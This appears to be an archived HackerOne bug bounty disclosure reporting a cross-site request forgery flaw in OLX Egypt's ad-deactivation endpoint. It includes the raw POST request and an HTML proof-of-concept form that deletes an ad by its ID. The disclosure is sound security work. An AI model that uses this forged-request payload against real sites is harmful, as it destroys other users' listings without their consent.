@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/178384
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/mohamedsherif
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:06.05.2017 16:55:20
+
+Summary:
+
+I found a CSRF in the request made while deleting any ad from olx
+the request sent when deleting any ad is like this
+
+POST /ajax/myaccount/deactivateme/ HTTP/1.1
+Host: olx.com.eg
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://olx.com.eg/myaccount/
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 31
+Cookie: ... 
+Connection: close
+
+adID=106381284&reasonID=4&text=
+
+As you can see the request doesn't have any protection against CSRF ( no CSRF token ) and to delete any ad you have to only change the "adID" with the target id that you can get from the ad page from it's source code
+
+You can simply inject this request using this POC
+
+<html>
+  <body>
+    <form action="https://olx.com.eg/ajax/myaccount/deactivateme/" method="POST">
+      <input type="hidden" name="adID" value="106381284" />
+      <input type="hidden" name="reasonID" value="4" />
+      <input type="hidden" name="text" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+This vulnerability can simply allow any hacker to delete all the posts on the website or to leave only his ads on the website so he can sell his products faster
+
+Hope you can reply fast because of the severity of the vulnerability
